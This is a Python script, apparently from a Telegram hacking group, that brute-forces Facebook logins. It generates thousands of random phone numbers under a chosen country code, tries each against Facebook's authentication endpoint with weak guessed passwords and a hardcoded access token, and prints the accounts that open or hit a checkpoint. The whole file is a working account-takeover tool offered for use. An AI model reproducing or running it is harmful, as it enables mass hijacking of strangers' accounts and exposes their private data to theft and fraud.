#======= SC SEND BY > KALYAN KING

#======== TELIGERM : KGF CYBER TEM 
import os#কল্যান ভাই
import random, requests, urllib, urllib.request, re, json, time, string, sys
from concurrent.futures import ThreadPoolExecutor 
from time import sleep
import user_agent
from cfonts import render
os.system("xdg-open https://t.me/KGF_TEAM_CYBER")
os.system("xdg-open https://t.me/KGF_TEAM_CYBER")
Login=render('Team3742 ',colors=['red','green'], align='center')
id = []
def print_x(lp):print(lp)
OSNAME = os.name
def make_generate_number():
     rer = random.randint
     for _ in range(int(random.choice(['20000','25000','30000']))):
       num = rer(0000000, 9999999)
       nums=str(''.join(random.choice(string.digits)for w in range(7)))
       id.append(str(nums))
     
     
class appollooop_Team3742Best:
          hits=0
          def main_menu(self):
             self.ok=0
             self.cp=0
             self.urlloginappollo='https://b-graph.facebook.com/auth/login'
             self.loop=0
             self.crack()
          def Responses(self,response):
              if 'session_key' in response:
                 return True
              elif 'www.facebook.com' in response['error']['message']:  
                 return False              
          def Headers(self):
             return {
             'user-agent':'Dalvik/2.1.0 (Linux; U; Android 15; 2310FPCA4G Build/AP3A.240905.015.A2) [FBAN/Orca-Android;FBAV/418.0.0.32.199;FBBV/836503242;FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/Xiaomi;FBBD/POCO;FBDV/2310FPCA4G;FBSV/15;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=8.6,width=996,height=1303};FB_FW/1;]',
             'Host':'graph.facebook.com',
             'Content-Type':'application/json;charset=utf-8',
             'Content-Length':'595',
             'Connection':'Keep-Alive',
             'Accept-Encoding':'gzip'
             }
          def Data(self,idf,pw):
             return {
             "locale": "en_GB",
             "format": "json",
             "email":idf,
             "password": pw,
             "access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28",
             "generate_session_cookies": 1
             }
          def crack(self):
              os.system('cls' if OSNAME != 'posix' else 'clear')              
              print_x(Login)
              print_x('')
              print_x(                 '\033[1;33m\033[1mDeveloper: Appollo'                )
              print_x(      '\033[1;37m\033[1m-'*45         )
              SYSK=input( '\033[1;33m\033[1mPut Code Kurdistan Iraq[+964]: ')
              self.code=SYSK
              make_generate_number()
              self.run()
          def run(self):
             with ThreadPoolExecutor(max_workers=25) as appolloteam7izz:
               print_x(         '\033[1;37m\033[1m-'*45     )
               for ids in id:
                  idf=self.code+str(ids)
                  Pwx=[self.code+str(ids),str(ids),"20102010","1122334455@@","11223344@@"]
                  appolloteam7izz.submit(self.cracked,idf,Pwx)
             print_x(                       ""                      )
             print_x(           '\033[1;37m\033[1m-'*45             )
             print_x(           '\033[1;37m\033[1mCrackedCompleted'         )
             exit()
          def cracked(self,idf,Pwx):
                  try:
                          sys.stdout.write(f"\r\r\r\033[1;37m\033[1m[Team3742] {self.loop} | {str(len(id))} | OK:-{self.ok} | CP:-{self.cp} "),
                          sys.stdout.flush()
                          for pw in Pwx:                          
                                   headers=self.Headers()
                                   data=self.Data(idf,pw)
                                   
                                   response=requests.post(self.urlloginappollo,headers=headers,data=data,allow_redirects=False).json()   
                                   #print_x(response)
                                   #print_x(headers)
                                   #print_x(data)
                                   #print_x(idf)
                                   #print_x(pw)                               
                                   if self.Responses(response) == True:
                                      uids=response['uid']
                                      print_x(f"\r\r\033[0;32m\033[1mTeam3742[OK] {uids} | {pw}          ")
                                      self.ok+=1
                                   elif self.Responses(response) == False:
                                      uids=response['error']['error_data']['uid']
                                      print_x(f"\r\r\033[1;33m\033[1mTeam3742[CP] {uids} | {pw}          ")
                                      self.cp+=1                                   
                                   else: 
                                       pass
                          self.loop+=1
                  except Exception as e:
                     pass
                     
               
               
               
XXX = appollooop_Team3742Best()
XXX.main_menu()              
              
              
                     
      


                 
